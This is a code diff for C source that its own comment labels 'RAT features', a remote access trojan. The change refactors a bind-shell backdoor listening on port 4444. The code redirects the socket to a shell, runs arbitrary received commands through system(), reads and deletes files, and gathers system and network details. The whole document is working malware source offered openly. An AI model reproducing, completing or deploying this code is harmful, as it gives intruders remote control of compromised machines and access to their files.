@@ -11,30 +11,34 @@
 
 #include "interface.h"
 
-/* Function Definitions for all features */
+/* Platform dependent RAT features */
 
-void run_command(int sockfd, const char *argument)
-{
-    dup2(sockfd, 1);
-    dup2(sockfd, 0);
-    system(argument);
-}
-
-void delete_file(int sockfd, const char *filepath)
+void read_file(int sockfd, const char *filepath)
 {
     dup2(sockfd, 0);
     dup2(sockfd, 1);
     dup2(sockfd, 2);
 
-    if (remove(filepath) == 0)
+    FILE *fp;
+    char *line = NULL;
+
+    size_t len = 0;
+    ssize_t read;
+
+    fp = fopen(filepath, "r");
+
+    if (fp == NULL)
     {
-       printf("File deleted successfully!\n");
+        printf("[!] Unable to open file\n");
+	exit(1);
     }
 
-    else
+    while ((read = getline(&line, &len, fp)) != -1)
     {
-       printf("Error deleting file!\n");
+        printf("%s", line);
     }
+
+    fclose(fp);
 }
 
 void system_info(int sockfd)
@@ -43,80 +47,93 @@ void system_info(int sockfd)
     dup2(sockfd, 1);
     dup2(sockfd, 2);
 
-    system("ifconfig;lscpu");
+    system("ifconfig ; lscpu");
 }
 
-void networking_information(int sockfd)
+void run_command(int sockfd, const char *argument)
 {
     dup2(sockfd, 0);
     dup2(sockfd, 1);
     dup2(sockfd, 2);
 
-    system("netstat -ano");
+    system(argument);
 }
 
-const char *parse_feature(char input[])
+void delete_file(int sockfd, const char *filename)
 {
-    char *token = strtok(input, "(");
-    return token;
-}
+    dup2(sockfd, 0);
+    dup2(sockfd, 1);
+    dup2(sockfd, 2);
 
-const char *parse_argument(char input[])
-{
-    char *token;
-    strtok(input, "(");
-    token = strtok(NULL, ")");
-    return token;
-
-}
-
-/* Main function, handles socket and networking */
-
-int main(void)
-{
-    int server_fd, new_socket, valread;
-    char buffer[1024] = {0};
-    char copy[1024] = {0};
-
-    struct sockaddr_in address;
-    int addrlen = sizeof(address);
-
-    server_fd = socket(AF_INET, SOCK_STREAM, 0);
-    
-    address.sin_family = AF_INET;
-    address.sin_port = htons(4444);
-    address.sin_addr.s_addr = INADDR_ANY;
-
-    bind(server_fd, (struct sockaddr *)&address, addrlen);
-    listen(server_fd, 3);
-
-    new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
-
-    while(1){
-        valread = read(new_socket, buffer, 1024);
-
-        strncpy(copy, buffer, 1024);
-
-        const char *feature = parse_feature(buffer);
-        const char *argument = parse_argument(copy);
-
-        /* Call the appropriate function after the feature has been determined */
-
-        if (strcmp(feature, "execute") == 0)
-        {
-           run_command(new_socket, argument);
-        }
-
-        if (strcmp(feature, "delete") == 0)
-        {
-           delete_file(new_socket, argument);
-        }
-
-        if (strcmp(feature, "sysinfo") == 0)
-        {
-           system_info(new_socket);
-        }
+    if (remove(filename) == 0)
+    {
+        printf("[+] File deleted successfully\n");
     }
 
-    return 0;
+    else 
+    {
+        printf("[!] Error deleting file\n");
+    }
+}
+
+void networking_info(int sockfd)
+{
+    dup2(sockfd, 0);
+    dup2(sockfd, 1);
+    dup2(sockfd, 2);
+
+    system("netstat --listen");
+}
+
+/* Abstract function to create a socket */
+Hndl create_socket(const char *host, int port)
+{
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    return sockfd;
+}
+
+/* Abstract function to bind socket */
+Hndl bind_socket(int port, int sockfd)
+{
+    struct sockaddr_in address;
+    
+    address.sin_family = AF_INET;
+    address.sin_port = htons(port);
+    address.sin_addr.s_addr = INADDR_ANY;
+
+    int result = bind(sockfd, (struct sockaddr *)&address, sizeof(address));
+
+    return result;
+}
+
+/* Abstract function to listen on socket */
+Hndl listen_socket(int max_connections, int sockfd)
+{
+    int result = listen(sockfd, max_connections);
+
+    return result;
+}
+
+/* Abstract function to accept an incoming connection from client */
+Hndl accept_socket(int sockfd, int port)
+{
+    struct sockaddr_in address;
+
+    address.sin_family = AF_INET;
+    address.sin_port = htons(port);
+    address.sin_addr.s_addr = INADDR_ANY;
+
+    int addrlen = sizeof(address);
+    int new_socket = accept(sockfd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
+
+    return new_socket;
+}
+
+/* Abstract function to read from a socket connection */
+Hndl read_socket(int sockfd, char buffer[], int len)
+{
+    int valread = read(sockfd, buffer, len);
+
+    return valread;
 }
